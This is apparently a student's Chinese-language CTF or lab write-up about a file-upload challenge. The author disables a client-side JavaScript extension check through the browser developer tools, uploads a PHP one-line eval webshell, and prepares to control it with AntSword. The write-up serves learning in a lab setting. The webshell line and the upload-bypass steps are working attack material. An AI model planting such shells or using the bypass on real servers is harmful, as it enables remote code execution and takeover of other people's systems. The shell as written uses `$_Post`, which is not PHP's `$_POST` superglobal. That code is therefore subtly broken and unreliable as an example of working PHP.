# update1

## 解题思路：

- 首先打开网页，发现一个窗口，让我们上传文件，那我们先打开开发者页面看看里面的元素。

- 看到元素里面有一个js脚本，代码如下：

    ```javascript
    Array.prototype.contains = function (obj) {  
        var i = this.length;  
        while (i--) {  
            if (this[i] === obj) {  
                return true;  
            }  
        }  
        return false;  
    }  

    function check(){
    upfile = document.getElementById("upfile");
    submit = document.getElementById("submit");
    name = upfile.value;
    ext = name.replace(/^.+\./,'');

    if(['jpg','png'].contains(ext)){
        submit.disabled = false;
    }else{
        submit.disabled = true;

        alert('请选择一张图片文件上传!');
    }


    }
    ```

- 读一下代码，很明显，这是用来卡我们的上传类型的，不是.jpg或者.png都不给传，一旦检测到不是这两样，直接把上传按钮给锁死，点都点不了。

- 但是转念一想，这种在网页上直接把脚本写上去的行为，不就是明摆着让人改吗？于是直接把

    ```javascript
     if(['jpg','png'].contains(ext)){
        submit.disabled = false;
    }else{
        submit.disabled = true;

        alert('请选择一张图片文件上传!');
    }
    ```
    改成

    `submit.disabled = false;`

    ok,再上传东西就没有类型限制了。

- 能上传了，要怎么用呢？我查看了黄老师提供的中国菜刀的链接，但是不知道为什么，那个链接里的release全部清空了，于是只好找蚁剑。

- 到这里其实思路已经很明确了，我构造了一个php一句话木马：

    ```php
    <?php @eval($_Post[cmd]);?>
    ```

    并将这个木马成功传到了服务器上：

    ```html
    upload success : upload/1579691533.test.php
    <!Doctype html>
    <html>
    <head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />

    <script type="text/javascript">
    ```

- 接下来就是用工具链接服务器了，但是我在下载蚁剑时发现，无法在linux上使用，所以准备下载一个windows镜像，尝试在windows虚拟机里使用。